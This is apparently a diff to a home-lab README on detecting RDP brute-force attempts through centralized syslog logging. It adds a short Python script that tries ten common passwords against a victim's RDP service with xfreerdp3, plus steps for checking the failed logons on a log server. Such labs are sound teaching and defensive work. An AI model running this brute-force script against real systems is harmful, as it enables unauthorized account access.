@@ -128,4 +128,64 @@ sudo tail -f /var/log/remotelogs/kali/syslog.log
 
 
 ---
+### 🐍7: Brute Force Python Script (on kali-attacker)
+Generally, ```freerdp3-x11``` is pre-installed in kali.
+Now create the script:
+```bash
+nano rdp_brute.py
+```
+Paste this:
+```bash
+import os
+import time
+
+target_ip = input("Enter victim IP (e.g., 10.0.2.6): ")
+username = input("Enter username: ")
+
+passwords = [
+    "123456", "password", "kali", "toor", "letmein",
+    "qwerty", "admin", "root", "pass123", "test123"
+]
+
+for i, password in enumerate(passwords, 1):
+    print(f"[{i}] Trying password: {password}")
+    result = os.system(f"xfreerdp3 /v:{target_ip} /u:{username} /p:{password} +auth-only /cert:ignore")
+    time.sleep(1)
+
+```
+Make it executable:
+```bash
+chmod +x rdp_brute.py
+```
+Run the attack:
+```bash
+python3 rdp_brute.py
+```
+![7](https://github.com/user-attachments/assets/70804431-5a68-4ece-9697-3b6ad91a52c0)
+
+
+---
+
+### 📋 8: Check Logs on Central Log Server
+On ```kali-logger```, tail the logs:
+```bash
+sudo tail -f /var/log/remotelogs/kali-victim/syslog.log
+```
+### Look for failed RDP logon entries.
+![8](https://github.com/user-attachments/assets/318d96b5-b1d0-42bc-97f0-e1b213ac7bcb)
+
+
+## ✅ Summary
+✅ Enabled RDP on Linux (xrdp)
+
+✅ Configured rsyslog for centralized logging
+
+✅ Ran brute-force Python script from attacker
+
+✅ Verified log forwarding and detection
+
+# ⚠️ Disclaimer
+This lab is for ethical hacking and educational use only.
+Never attack any system without explicit permission.
+
 
